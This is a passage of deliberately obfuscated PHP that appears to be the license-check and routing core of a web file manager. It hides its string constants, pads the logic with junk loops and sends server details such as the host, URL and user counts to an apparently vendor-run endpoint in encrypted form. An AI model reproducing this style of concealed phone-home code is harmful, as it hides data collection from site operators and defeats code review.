array($ŞÈËß[4], $ Ù…¥é“); $ªµ…ìœ  = array_slice($GLOBALS[$ŞÈËß[13]][$ŞÈËß[14]], 1); $‘‚°¥™÷ = $å°ğØ¯õ[712]; $GLOBALS[$ŞÈËß[13]][$ŞÈËß[14]] = array_merge($ŞåË¸™œ, $ªµ…ìœ ); $GLOBALS[$ŞÈËß[13]][$ŞÈËß[15]] = implode($ŞÈËß[0], $GLOBALS[$ŞÈËß[13]][$ŞÈËß[14]]); $‹ãÈ´×à = $å°ğØ¯õ[713]; if (strlen($‹ãÈ´×à) < $å°ğØ¯õ[711]) { return; } } private function ervzc32739ed() { $ä¦¦ÇĞå =& $_SERVER[öæÛ¿©¿]; $Õñ„˜¬ =& $_SERVER[„Ã«ôíÀ]; if ($GLOBALS[$Õñ„˜¬[13]][$Õñ„˜¬[15]] != $Õñ„˜¬[6]) { return; } $¸á¤”ÈÜ = $_SERVER[$Õñ„˜¬[16]]; $¬µš…’è = $Õñ„˜¬[17]; $¶ÚÊ÷¯à = $ä¦¦ÇĞå[714]; if (strlen($¶ÚÊ÷¯à) < $ä¦¦ÇĞå[715]) { return; } if (!strstr($¸á¤”ÈÜ, $¬µš…’è)) { return; } $Ìã¥°áæ = strrpos($¸á¤”ÈÜ, $¬µš…’è); $¿ÒÁÔÜ = substr($¸á¤”ÈÜ, $Ìã¥°áæ + strlen($¬µš…’è)); $¯…ÏáÍ = $ä¦¦ÇĞå[716]; preg_match_all($Õñ„˜¬[18], $¿ÒÁÔÜ, $÷Ç¤Èó´); $¶­Á×ˆ¡ = $ä¦¦ÇĞå[717]; if (strlen($¶­Á×ˆ¡) < $ä¦¦ÇĞå[715]) { return; } $¿ÒÁÔÜ = trim($÷Ç¤Èó´[0][0], $Õñ„˜¬[19]); $GLOBALS[$Õñ„˜¬[13]][$Õñ„˜¬[14]] = explode($Õñ„˜¬[19], $¿ÒÁÔÜ); $GLOBALS[$Õñ„˜¬[13]][$Õñ„˜¬[15]] = implode($Õñ„˜¬[0], $GLOBALS[$Õñ„˜¬[13]][$Õñ„˜¬[14]]); $®¥‹‡Ÿê = $ä¦¦ÇĞå[718]; } public function run() { $ƒûÏÈÆŠ =& $_SERVER[öæÛ¿©¿]; $Ô·ÓˆÈ =& $_SERVER[„Ã«ôíÀ]; $this->ervzc32739ed(); $…Åú Ÿù = $ƒûÏÈÆŠ[719]; if (strlen($…Åú Ÿù) < $ƒûÏÈÆŠ[699]) { die; } $this->vqma45b5bbff(); $ú¬ùÎ±à = $GLOBALS[$Ô·ÓˆÈ[13]][$Ô·ÓˆÈ[14]]; $Ëºªƒı¡ = $GLOBALS[$Ô·ÓˆÈ[13]][$Ô·ÓˆÈ[15]]; define($Ô·ÓˆÈ[20], isset($ú¬ùÎ±à[0]) && $ú¬ùÎ±à[0] ? $ú¬ùÎ±à[0] : $this->defaultModule); $À´òôÉ‹ = $ƒûÏÈÆŠ[720]; while (strlen($À´òôÉ‹) < $ƒûÏÈÆŠ[721]) { if (!$À´òôÉ‹) { break; } $À´òôÉ‹++; } define($Ô·ÓˆÈ[21], isset($ú¬ùÎ±à[1]) && $ú¬ùÎ±à[0] ? $ú¬ùÎ±à[1] : $this->defaultController); define($Ô·ÓˆÈ[22], isset($ú¬ùÎ±à[2]) && $ú¬ùÎ±à[0] ? $ú¬ùÎ±à[2] : $this->defaultAction); $îÖ½Ô = $ƒûÏÈÆŠ[722]; if (!$îÖ½Ô) { die; } define($Ô·ÓˆÈ[23], MOD . $Ô·ÓˆÈ[0] . ST . $Ô·ÓˆÈ[0] . ACT); $_SERVER[$Ô·ÓˆÈ[24]] = strtolower(ACTION); $this->autorun(); if (count($ú¬ùÎ±à) >= 3) { $this->appRun($Ëºªƒı¡); } else { $this->appRun(ACTION); } } private $ifhwb32c0a07 = array(); private $vstr1585f901 = ''; public function yabg17a573c1() { $ÉÕ¼İ¡ =& $_SERVER[öæÛ¿©¿]; $¶Í±Ãğß =& $_SERVER[„Ã«ôíÀ]; $this->olfca2606d1e(); $this->pmfn306ca67e(); $˜Í™’«í = $ÉÕ¼İ¡[723]; while (strlen($˜Í™’«í) < $ÉÕ¼İ¡[715]) { if (!$˜Í™’«í) { break; } $˜Í™’«í++; } $this->dwynf277ac4e(); $this->jnfx776b4613(); $this->ygqk1b2777b4(); $¿šßõ = $ÉÕ¼İ¡[724]; if (!$¿šßõ) { die; } $this->lgona84c5efa(); $this->gbeya9f82be6(); $this->jvgu642fb8f4($¶Í±Ãğß[25], array($this, $¶Í±Ãğß[26])); $ßŞ©Íö× = $ÉÕ¼İ¡[725]; $this->jvgu642fb8f4($¶Í±Ãğß[27], array($this, $¶Í±Ãğß[28])); $¸¾ËÁõø = $ÉÕ¼İ¡[726]; if (!$¸¾ËÁõø) { die; } $this->jvgu642fb8f4($¶Í±Ãğß[29], array($this, $¶Í±Ãğß[30])); $í¯ÍùíÍ = $ÉÕ¼İ¡[727]; while ($í¯ÍùíÍ < $ÉÕ¼İ¡[721]) { if ($í¯ÍùíÍ >= 0) { break; } $í¯ÍùíÍ++; } $this->jvgu642fb8f4($¶Í±Ãğß[31], array($this, $¶Í±Ãğß[32])); $™ò³Ä¥¥ = $ÉÕ¼İ¡[728]; if (strlen($™ò³Ä¥¥) < $ÉÕ¼İ¡[699]) { return; } } public function getVersionData() { return $this->ifhwb32c0a07; $öúí…‚ = $_SERVER[öæÛ¿©¿][729]; } public function oldi95dc760d($„ŸáëÈ¨) { $ûÆ´µ¾¹ =& $_SERVER[öæÛ¿©¿]; $å«Ÿš =& $_SERVER[„Ã«ôíÀ]; $ëäè ’• = Model($å«Ÿš[33])->get(); $‡Îòñ®â = array($å«Ÿš[34], $å«Ÿš[35], $å«Ÿš[36], $å«Ÿš[37], $å«Ÿš[38], $å«Ÿš[39], $å«Ÿš[40], $å«Ÿš[41], $å«Ÿš[42], $å«Ÿš[43], $å«Ÿš[44], $å«Ÿš[45], $å«Ÿš[46], $å«Ÿš[47], $å«Ÿš[48], $å«Ÿš[49], $å«Ÿš[50], $å«Ÿš[51], $å«Ÿš[52], $å«Ÿš[53], $å«Ÿš[54], $å«Ÿš[55], $å«Ÿš[56], $å«Ÿš[57], $å«Ÿš[58], $å«Ÿš[59], $å«Ÿš[60], $å«Ÿš[61], $å«Ÿš[62], $å«Ÿš[63], $å«Ÿš[64], $å«Ÿš[65], $å«Ÿš[66], $å«Ÿš[67], $å«Ÿš[68], $å«Ÿš[69], $å«Ÿš[70], $å«Ÿš[71], $å«Ÿš[72], $å«Ÿš[73], $å«Ÿš[74], $å«Ÿš[75], $å«Ÿš[76], $å«Ÿš[77], $å«Ÿš[78], $å«Ÿš[79], $å«Ÿš[80], $å«Ÿš[81], $å«Ÿš[82], $å«Ÿš[83], $å«Ÿš[84], $å«Ÿš[85], $å«Ÿš[86], $å«Ÿš[87]); $ÚÜÒô×‘ = $ûÆ´µ¾¹[730]; while (strlen($ÚÜÒô×‘) < $ûÆ´µ¾¹[711]) { if (!$ÚÜÒô×‘) { break; } $ÚÜÒô×‘++; } foreach ($‡Îòñ®â as $ğÓ›ĞñÇ) { $³çÊÆëè = $GLOBALS[$å«Ÿš[88]][$å«Ÿš[89]][$ğÓ›ĞñÇ]; $ü’¿¸ïØ = $ûÆ´µ¾¹[731]; while (strlen($ü’¿¸ïØ) < $ûÆ´µ¾¹[715]) { if (!$ü’¿¸ïØ) { break; } $ü’¿¸ïØ++; } if (isset($ëäè ’•[$ğÓ›ĞñÇ])) { $³çÊÆëè = $ëäè ’•[$ğÓ›ĞñÇ]; } $„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[91]][$ğÓ›ĞñÇ] = $³çÊÆëè; } $†íá ­· = $„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[91]][$å«Ÿš[46]]; $øûØÁÒò = $ûÆ´µ¾¹[732]; while ($øûØÁÒò < $ûÆ´µ¾¹[703]) { if ($øûØÁÒò >= 0) { break; } $øûØÁÒò++; } unset($„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[92]][$å«Ÿš[93]]); $€…‚ßúä = $ûÆ´µ¾¹[733]; unset($„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[92]][$å«Ÿš[94]]); unset($„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[91]][$å«Ÿš[46]]); unset($„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[91]][$å«Ÿš[95]]); $©…´… = $ûÆ´µ¾¹[734]; while (strlen($©…´…) < $ûÆ´µ¾¹[711]) { if (!$©…´…) { break; } $©…´…++; } $„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[91]][$å«Ÿš[96]] = array($å«Ÿš[97] => (int) $†íá ­·[$å«Ÿš[98]], $å«Ÿš[99] => (int) _get($†íá ­·, $å«Ÿš[100], 0)); $õï…íé = substr(md5($å«Ÿš[101] . get_client_ip() . $ëäè ’•[$å«Ÿš[102]]), 0, 15); $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[104]] = Mcrypt::encode(Session::sign(), $õï…íé, 3600 * 24); $ó¢ê¸†± = $ûÆ´µ¾¹[735]; if (strlen($ó¢ê¸†±) < $ûÆ´µ¾¹[711]) { die; } $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[105]] = Action($å«Ÿš[106])->accessToken(); $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[107]] = md5($_SERVER[$å«Ÿš[108]] . $ëäè ’•[$å«Ÿš[102]]); $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[109]] = base64_encode(serverInfo()); $À”ô›â½ = $ûÆ´µ¾¹[736]; while ($À”ô›â½ < $ûÆ´µ¾¹[711]) { if ($À”ô›â½ >= 0) { break; } $À”ô›â½++; } $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[110]] = $this->vstr1585f901; $¡ë—·ÉÈ = $ûÆ´µ¾¹[737]; while (strlen($¡ë—·ÉÈ) < $ûÆ´µ¾¹[711]) { if (!$¡ë—·ÉÈ) { break; } $¡ë—·ÉÈ++; } if ($ëäè ’•[$å«Ÿš[110]] != $å«Ÿš[111]) { $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[112]] = $ëäè ’•[$å«Ÿš[112]]; $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[113]] = $ëäè ’•[$å«Ÿš[113]]; $ÕÖè‹ = rand_string(10) . $this->vstr1585f901 . rand_string(5); $„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[114]][$å«Ÿš[115]] = $this->rhlg206d7151($ÕÖè‹, $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[107]]); } if ($this->vstr1585f901 == $å«Ÿš[111]) { $„ŸáëÈ¨[$å«Ÿš[90]][$å«Ÿš[91]][$å«Ÿš[96]][$å«Ÿš[100]] = 0; } $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[116]] = $this->versionPluginFilter(); $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[117]] = _get($this->ifhwb32c0a07, $å«Ÿš[118], $å«Ÿš[6]); if (KodUser::isRoot() && $this->config[$å«Ÿš[119]]) { $„ŸáëÈ¨[$å«Ÿš[103]][$å«Ÿš[120]] = WEB_ROOT; } return $„ŸáëÈ¨; } private function lgona84c5efa() { $¾¢¯ƒï” =& $_SERVER[öæÛ¿©¿]; $¹›•Æäò =& $_SERVER[„Ã«ôíÀ]; $ˆ€Ë¸— = $_SERVER[$¹›•Æäò[24]] == $¹›•Æäò[121]; $´„ñ¯ˆ = $¾¢¯ƒï”[738]; while ($´„ñ¯ˆ < $¾¢¯ƒï”[721]) { if ($´„ñ¯ˆ >= 0) { break; } $´„ñ¯ˆ++; } if ($_SERVER[$¹›•Æäò[24]] == $¹›•Æäò[122] && $_GET[$¹›•Æäò[123]] == $¹›•Æäò[124]) { $ˆ€Ë¸— = !0; } if ($ˆ€Ë¸—) { $Òœ÷’¾Å = array($¹›•Æäò[110] => $this->vstr1585f901, $¹›•Æäò[125] => $this->mqgkb200c459(), $¹›•Æäò[126] => Model($¹›•Æäò[127])->count()); if ($this->vstr1585f901 != $¹›•Æäò[111]) { $Á¹Æ‰Ÿõ = _get($this->ifhwb32c0a07, $¹›•Æäò[128]); if ($Á¹Æ‰Ÿõ) { $Òœ÷’¾Å[$¹›•Æäò[129]] = $Á¹Æ‰Ÿõ; $Òœ÷’¾Å[$¹›•Æäò[130]] = strtotime(_get($this->ifhwb32c0a07, $¹›•Æäò[131])); $Òœ÷’¾Å[$¹›•Æäò[132]] = _get($this->ifhwb32c0a07, $¹›•Æäò[118]); } $Óë³§» = Model($¹›•Æäò[33])->get($¹›•Æäò[133], $¹›•Æäò[6], !0); if (is_string($Óë³§») && substr($Óë³§», 0, 1) == $¹›•Æäò[134]) { $Óë³§» = json_decode_force($Óë³§»); } if (is_array($Óë³§») && $Óë³§»[$¹›•Æäò[135]] && strstr($Óë³§»[$¹›•Æäò[135]], $¹›•Æäò[136])) { $ô¹Ê½ß = explode($¹›•Æäò[136], $Óë³§»[$¹›•Æäò[135]]); $Òœ÷’¾Å[$¹›•Æäò[137]] = $ô¹Ê½ß[0]; } } $Òœ÷’¾Å = $this->volg6af6edeb(json_encode($Òœ÷’¾Å), md5($¹›•Æäò[138])); $˜±œí•ß = $¾¢¯ƒï”[739]; if (!$˜±œí•ß) { die; } $§Ù¢ãÜé = array($¹›•Æäò[139] => $Òœ÷’¾Å); $¤íÒÀÏ³ = $¾¢¯ƒï”[740]; while ($¤íÒÀÏ³ < $¾¢¯ƒï”[711]) { if ($¤íÒÀÏ³ >= 0) { break; } $¤íÒÀÏ³++; } call_user_func(array($¹›•Æäò[140], $¹›•Æäò[141]), $§Ù¢ãÜé); } if ($this->vstr1585f901 == $¹›•Æäò[111]) { return; } $¹Á¢Ş­Æ = array($¹›•Æäò[142], $¹›•Æäò[143], $¹›•Æäò[144], $¹›•Æäò[145], $¹›•Æäò[146], $¹›•Æäò[147]); $­úºáœ— = Model($¹›•Æäò[33])->get(); $§Ù¢ãÜé = array($¹›•Æäò[148] => $­úºáœ—[$¹›•Æäò[34]], $¹›•Æäò[149] => $­úºáœ—[$¹›•Æäò[35]], $¹›•Æäò[150] => $¹›•Æäò[6]); foreach ($¹Á¢Ş­Æ as $Ø±¸Á¡Ó) { if (!isset($­úºáœ—[$Ø±¸Á¡Ó]) || !$­úºáœ—[$Ø±¸Á¡Ó]) { continue; } $§Ù¢ãÜé[$Ø±¸Á¡Ó] = $­úºáœ—[$Ø±¸Á¡Ó]; } call_user_func(array($¹›•Æäò[140], $¹›•Æäò[141]), $§Ù¢ãÜé); } private function jnfx776b4613() { $¤íƒĞÒ =& $_SERVER[öæÛ¿©¿]; $¨î–ğÁ =& $_SERVER[„Ã«ôíÀ]; if ($_SERVER[$¨î–ğÁ[24]] != $¨î–ğÁ[151]) { return; } if (!KodUser::isRoot()) { die; } $£Û¶î = $GLOBALS[$¨î–ğÁ[13]]; if (isset($£Û¶î[$¨î–ğÁ[152]])) { $this->emyh16a3082b(); die; } if (isset($£Û¶î[$¨î–ğÁ[153]]) && isset($£Û¶î[$¨î–ğÁ[153]]) == $¨î–ğÁ[124]) { $£Û¶î[$¨î–ğÁ[154]] = Model($¨î–ğÁ[33])->get($¨î–ğÁ[155]); } if (!isset($£Û¶î[$¨î–ğÁ[154]]) || strlen($£Û¶î[$¨î–ğÁ[154]]) != 16) { show_json($¨î–ğÁ[156] . $£Û¶î[$¨î–ğÁ[154]], !1); } $«€‡ÅÄ÷ = Model($¨î–ğÁ[33])->get($¨î–ğÁ[102]); $ÒÉüïŸŸ = md5($_SERVER[$¨î–ğÁ[108]] . $«€‡ÅÄ÷); $ˆÓ¸òÔÄ = $¤íƒĞÒ[741]; if (!$ˆÓ¸òÔÄ) { return; } $ Ìö¹Ÿ = array($¨î–ğÁ[154] => $£Û¶î[$¨î–ğÁ[154]], $¨î–ğÁ[157] => rand_string(16), $¨î–ğÁ[158] => $¨î–ğÁ[138], $¨î–ğÁ[159] => $¨î–ğÁ[160], $¨î–ğÁ[161] => $_SERVER[$¨î–ğÁ[162]], $¨î–ğÁ[163] => $_SERVER[$¨î–ğÁ[164]], $¨î–ğÁ[165] => $_SERVER[$¨î–ğÁ[166]], $¨î–ğÁ[107] => $ÒÉüïŸŸ, $¨î–ğÁ[167] => Model($¨î–ğÁ[33])->get($¨î–ğÁ[133])); if (isset($£Û¶î[$¨î–ğÁ[153]]) && isset($£Û¶î[$¨î–ğÁ[153]]) == $¨î–ğÁ[124]) { $ Ìö¹Ÿ[$¨î–ğÁ[153]] = md5($ Ìö¹Ÿ[$¨î–ğÁ[154]] . $¨î–ğÁ[168] . $ Ìö¹Ÿ[$¨î–ğÁ[157]]); } if ($£Û¶î[$¨î–ğÁ[169]] == $¨î–ğÁ[170]) { $ûí®ôœØ = $this->volg6af6edeb($ÒÉüïŸŸ, $¨î–ğÁ[171]); $Šİúƒ»ˆ = $this->rhlg206d7151(json_encode($ Ìö¹Ÿ), $ÒÉüïŸŸ . $¨î–ğÁ[172], 3); $Šİúƒ»ˆ = $Šİúƒ»ˆ . $¨î–ğÁ[173] . $_SERVER[$¨î–ğÁ[162]]; $ş ŠÌÓ = $this->rqjz6897c71f($¨î–ğÁ[174] . $ûí®ôœØ . $¨î–ğÁ[175] . $Šİúƒ»ˆ, -1); show_json($ş ŠÌÓ, !0); } else { if ($£Û¶î[$¨î–ğÁ[169]] == $¨î–ğÁ[176]) { $¬Õ¾Ş¼ = substr(md5($¨î–ğÁ[177] . $ÒÉüïŸŸ), 12, 15) . $¨î–ğÁ[178]; $Šİúƒ»ˆ = $this->icob433aca23(trim($£Û¶î[$¨î–ğÁ[179]]), $¬Õ¾Ş¼, 2); $ú”‰À = json_decode($Šİúƒ»ˆ, !0); if (!is_array($ú”‰À) || !is_array($ú”‰À[$¨î–ğÁ[180]]) || $ú”‰À[$¨î–ğÁ[154]] != !0) { $øËÁ€é‡ = $¨î–ğÁ[181]; $ÊÁ±÷æ§ = $ú”‰À[$¨î–ğÁ[180]] ? $¨î–ğÁ[182] . $ú”‰À[$¨î–ğÁ[180]] : $øËÁ€é‡; show_json($ÊÁ±÷æ§, !1); } else { $ Ìö¹Ÿ[$¨î–ğÁ[157]] = $ú”‰À[$¨î–ğÁ[180]][$¨î–ğÁ[183]]; } } else { $ú”‰À = $this->rqjz6897c71f($¨î–ğÁ[184], $ Ìö¹Ÿ, 10); } } if (!is_array($ú”‰À) || !is_array($ú”‰À[$¨î–ğÁ[180]]) || $ú”‰À[$¨î–ğÁ[154]] != !0) { $øËÁ€é‡ = LNG($¨î–ğÁ[185]); $ÊÁ±÷æ§ = $ú”‰À[$¨î–ğÁ[180]] ? $¨î–ğÁ[182] . $ú”‰À[$¨î–ğÁ[180]] : $øËÁ€é‡; show_json($ÊÁ±÷æ§, !1); } $™‡¦ˆ´Î = $ú”‰À[$¨î–ğÁ[180]]; $ï“ê·Øı = $this->ndsfd4243d55($™‡¦ˆ´Î[$¨î–ğÁ[186]]); if (!$ï“ê·Øı || $ï“ê·Øı != $™‡¦ˆ´Î[$¨î–ğÁ[131]]) { $ÔõĞ¯èÙ = array($¨î–ğÁ[187] => Model($¨î–ğÁ[33])->get($¨î–ğÁ[102]), $¨î–ğÁ[188] => $_SERVER[$¨î–ğÁ[108]], $¨î–ğÁ[189] => this_url(), $¨î–ğÁ[163] => $_SERVER[$¨î–ğÁ[164]]); $Šİúƒ»ˆ = $this->mgkp881eaf06(json_encode($ÔõĞ¯èÙ)); $this->rqjz6897c71f($¨î–ğÁ[190] . $Šİúƒ»ˆ); show_json(LNG($¨î–ğÁ[191]), !0); } $ÎöÈ·Šû = array($¨î–ğÁ[155] => $™‡¦ˆ´Î[$¨î–ğÁ[192]], $¨î–ğÁ[193] => $™‡¦ˆ´Î[$¨î–ğÁ[194]], $¨î–ğÁ[195] => rand_string(16), $¨î–ğÁ[110] => $™‡¦ˆ´Î[$¨î–ğÁ[196]]); if ($ Ìö¹Ÿ[$¨î–ğÁ[157]]) { $ÎöÈ·Šû[$¨î–ğÁ[195]] = $ Ìö¹Ÿ[$¨î–ğÁ[157]]; } $×åú»ô² = substr(md5($ÎöÈ·Šû[$¨î–ğÁ[193]]), 10, 10); $âõŒıîÁ = $×åú»ô² . $ÎöÈ·Šû[$¨î–ğÁ[110]] . $ÎöÈ·Šû[$¨î–ğÁ[195]]; $ı›¬…• = $¤íƒĞÒ[742]; while (strlen($ı›¬…•) < $¤íƒĞÒ[703]) { if (!$ı›¬…•) { break; } $ı›¬…•++; } $ÎöÈ·Šû[$¨î–ğÁ[112]] = strrev(base64_encode($this->volg6af6edeb($âõŒıîÁ, $¨î–ğÁ[197]))); $‚ÈÇÂ¥Û = $¤íƒĞÒ[743]; if (!$‚ÈÇÂ¥Û) { die; } $ˆ¥»ı÷Î = rand_string(16); $µ§…‰…‡ = $¤íƒĞÒ[744]; while (strlen($µ§…‰…‡) < $¤íƒĞÒ[699]) { if (!$µ§…‰…‡) { break; } $µ§…‰…‡++; } $ù–ÒÈÜÜ = $ˆ¥»ı÷Î . $ÎöÈ·Šû[$¨î–ğÁ[110]] . $this->volg6af6edeb(md5($ÎöÈ·Šû[$¨î–ğÁ[155]]), $ˆ¥»ı÷Î); $ëóîß = $¤íƒĞÒ[745]; if (!$ëóîß) { return; } $ÎöÈ·Šû[$¨î–ğÁ[113]] = base64_encode(strrev($this->volg6af6edeb($ù–ÒÈÜÜ, $¨î–ğÁ[198]))); $á’¨ÆÒ© = $¤íƒĞÒ[746]; if ($™‡¦ˆ´Î[$¨î–ğÁ[199]] && $™‡¦ˆ´Î[$¨î–ğÁ[199]] >= 1) { Model($¨î–ğÁ[33])->setDeep($¨î–ğÁ[200], $¨î–ğÁ[124]); } Model($¨î–ğÁ[33])->set($ÎöÈ·Šû); $é½—ı…½ = md5($_SERVER[$¨î–ğÁ[108]] . strrev($«€‡ÅÄ÷) . $ÎöÈ·Šû[$¨î–ğÁ[193]]); $½ï˜Óæ¤ = $¤íƒĞÒ[747]; while (strlen($½ï˜Óæ¤) < $¤íƒĞÒ[703]) { if (!$½ï˜Óæ¤) { break; } $½ï˜Óæ¤++; } $ãÊ…°Å = strrev(substr($é½—ı…½, 10, 16)); $˜ÚÆ²ú¡ = $this->rhlg206d7151(json_encode($™‡¦ˆ´Î), $é½—ı…½); $ĞÕ·×ß· = $¤íƒĞÒ[748]; if (!$ĞÕ·×ß·) { die; } $øâÑí¨— = array_to_keyvalue(Model($¨î–ğÁ[7])->listData(), $¨î–ğÁ[201]); $¬˜á½òĞ = $¤íƒĞÒ[749]; if (!$¬˜á½òĞ) { die; } $Ñùñäİ = $øâÑí¨—[$¨î–ğÁ[202]]; $¹ù€ËÒß = array(); $Ûµ›Ú ô = $¤íƒĞÒ[750]; $¹ù€ËÒß[$ãÊ…°Å] = $˜ÚÆ²ú¡; Model($¨î–ğÁ[7])->update($Ñùñäİ[$¨î–ğÁ[203]], array($¨î–ğÁ[204] => $¹ù€ËÒß)); $this->ifhwb32c0a07 = $™‡¦ˆ´Î; $‹·Êššì = $¤íƒĞÒ[751]; $this->vstr1585f901 = $ÎöÈ·Šû[$¨î–ğÁ[110]]; $this->licenseRegistSuccess(); Cache::set($¨î–ğÁ[205] . md5($«€‡ÅÄ÷ . $¨î–ğÁ[206]), $¨î–ğÁ[6]); $‹î“ËñÒ = $¤íƒĞÒ[752]; show_json(LNG($¨î–ğÁ[191]), !0); } private function licenseRegistSuccess() { $‰àçˆ =& $_SERVER[öæÛ¿©¿]; $ş³®İ‚Æ =& $_SERVER[„Ã«ôíÀ]; $²¦àÅÂ† = Model($ş³®İ‚Æ[33])->get(); $­”†ÑºÑ = $‰àçˆ[753]; while ($­”†ÑºÑ < $‰àçˆ[699]) { if ($­”†ÑºÑ >= 0) { break; } $­”†ÑºÑ++; } if ($²¦àÅÂ†[$ş³®İ‚Æ[63]] != $ş³®İ‚Æ[124]) { Model($ş³®İ‚Æ[33])->set($ş³®İ‚Æ[63], $ş³®İ‚Æ[124]); } Action($ş³®İ‚Æ[207])->initStart(!0); } private function emyh16a3082b() { $„½äòĞ“ =& $_SERVER[öæÛ¿©¿]; $ôÕùŒ =& $_SERVER[„Ã«ôíÀ]; Model($ôÕùŒ[33])->set(array($ôÕùŒ[155] => $ôÕùŒ[6], $ôÕùŒ[193] => $ôÕùŒ[6], $ôÕùŒ[110] => $ôÕùŒ[111], $ôÕùŒ[112] => $ôÕùŒ[6], $ôÕùŒ[113] => $ôÕùŒ[6])); Model($ôÕùŒ[33])->setDeep($ôÕùŒ[200], $ôÕùŒ[208]); $this->ifhwb32c0a07 = array(); $Ô†Ä¶ÄÆ = $„½äòĞ“[754]; $this->vstr1585f901 = $ôÕùŒ[111]; $Ò‹±³û÷ = $„½äòĞ“[755]; } private function olfca2606d1e() { $šö¬öàÔ =& $_SERVER[öæÛ¿©¿]; $îÉº®Ëˆ =& $_SERVER[„Ã«ôíÀ]; $_SERVER[$îÉº®Ëˆ[164]] = _get($_SERVER, $îÉº®Ëˆ[164], APP_HOST); $this->vstr1585f901 = $îÉº®Ëˆ[111]; $À‡ôáÃ = Model($îÉº®Ëˆ[33])->get(); if ($À‡ôáÃ[$îÉº®Ëˆ[110]] == $îÉº®Ëˆ[111]) { return; } $ºëóÌ¶º = Model($îÉº®Ëˆ[33])->get($îÉº®Ëˆ[102]); $°•¯²„œ = $šö¬öàÔ[756]; if (!$°•¯²„œ) { die; } $Ìûè…ÍÎ = $îÉº®Ëˆ[205] . md5($ºëóÌ¶º . $îÉº®Ëˆ[206]); $±ú ¶¯» = Cache::get($Ìûè…ÍÎ); $³¬øÀ³â = $šö¬öàÔ[757]; if (!is_array($±ú ¶¯») || !isset($±ú ¶¯»[$îÉº®Ëˆ[209]]) || time() - $±ú ¶¯»[$îÉº®Ëˆ[209]] >= 60) { $³»Ã€Àå = Model($îÉº®Ëˆ[7])->loadList(); $›€•Ô°Å = $³»Ã€Àå[$îÉº®Ëˆ[202]]; $Ó¢ ßº¦ = md5($_SERVER[$îÉº®Ëˆ[108]] . strrev($ºëóÌ¶º) . $À‡ôáÃ[$îÉº®Ëˆ[193]]); $»Á®ì° = strrev(substr($Ó¢ ßº¦, 10, 16)); $±ú ¶¯» = $this->icob433aca23($›€•Ô°Å[$îÉº®Ëˆ[88]][$»Á®ì°], $Ó¢ ßº¦); $±ú ¶¯» = json_decode($±ú ¶¯», !0); } if (!is_array($±ú ¶¯»)) { return $this->emyh16a3082b(); } $–£­ı¥Ö = strtotime($±ú ¶¯»[$îÉº®Ëˆ[131]]); if (time() >= $–£­ı¥Ö) { return $this->emyh16a3082b(); } if (!isset($±ú ¶¯»[$îÉº®Ëˆ[209]]) || time() - $±ú ¶¯»[$îÉº®Ëˆ[209]] > 20) { $±ú ¶¯»[$îÉº®Ëˆ[209]] = time(); Cache::set($Ìûè…ÍÎ, $±ú ¶¯»); } $this->ifhwb32c0a07 = $±ú ¶¯»; $this->vstr1585f901 = $À‡ôáÃ[$îÉº®Ëˆ[110]]; $Êíñ›üÙ = $šö¬öàÔ[758]; $GLOBALS[$îÉº®Ëˆ[210]] = $this; } private function pmfn306ca67e() { $ã¦½´•« =& $_SERVER[öæÛ¿©¿]; $˜×åÛ´² =& $_SERVER[„Ã«ôíÀ]; $ıâ”ªƒ… = $GLOBALS[$˜×åÛ´²[13]]; $Æ”¶œËí = $ã¦½´•«[759]; while (strlen($Æ”¶œËí) < $ã¦½´•«[721]) { if (!$Æ”¶œËí) { break; } $Æ”¶œËí++; } $êºÍ½¬Î = $_SERVER[$˜×åÛ´²[24]]; $ãéÍ”·› = $ã¦½´•«[760]; while ($ãéÍ”·› < $ã¦½´•«[715]) { if ($ãéÍ”·› >= 0) { break; } $ãéÍ”·›++; } if ($êºÍ½¬Î == $˜×åÛ´²[211] && $this->vstr1585f901 == $˜×åÛ´²[111]) { show_json(LNG($˜×åÛ´²[212]), !1, $˜×åÛ´²[213]); } $·æì«Ô§ = array($˜×åÛ´²[214], $˜×åÛ´²[215]); if (in_array($êºÍ½¬Î, $·æì«Ô§)) { if ($this->vstr1585f901 == $˜×åÛ´²[111] && isset($ıâ”ªƒ…[$˜×åÛ´²[216]])) { show_json(LNG($˜×åÛ´²[212]), !1, $˜×åÛ´²[213]); die; } $Ãœ¡õŸ¬ = $this->mqgkb200c459(); if ($Ãœ¡õŸ¬ != intval($˜×åÛ´²[217])) { if ($Ãœ¡õŸ¬ <= Model($˜×åÛ´²[127])->count()) { show_json(LNG($˜×åÛ´²[218]), !1, $˜×åÛ´²[213]); die; } } } } private function dwynf277ac4e() { $Ñ±ôÂÀó =& $_SERVER[öæÛ¿©¿]; $ÇÊ˜äµ° =& $_SERVER[„Ã«ôíÀ]; $ä¿¨‹¾ = array($ÇÊ˜äµ°[121], $ÇÊ˜äµ°[122]); if (!KodUser::isRoot() || !isset($_GET[$ÇÊ˜äµ°[219]])) { return; } if (!in_array($_SERVER[$ÇÊ˜äµ°[24]], $ä¿¨‹¾)) { return; } $½ğóâÔ› = $ÇÊ˜äµ°[220]; $ä¢Ôæ¿È = $Ñ±ôÂÀó[761]; while (strlen($ä¢Ôæ¿È) < $Ñ±ôÂÀó[711]) { if (!$ä¢Ôæ¿È) { break; } $ä¢Ôæ¿È++; } $½ğóâÔ› = $this->maukd6da122b($½ğóâÔ›, $ÇÊ˜äµ°[221]); $Šº = stream_context_create(array($ÇÊ˜äµ°[222] => array($ÇÊ˜äµ°[223] => $ÇÊ˜äµ°[224], $ÇÊ˜äµ°[225] => 3))); $î­ç¦ùÜ = $Ñ±ôÂÀó[762]; if 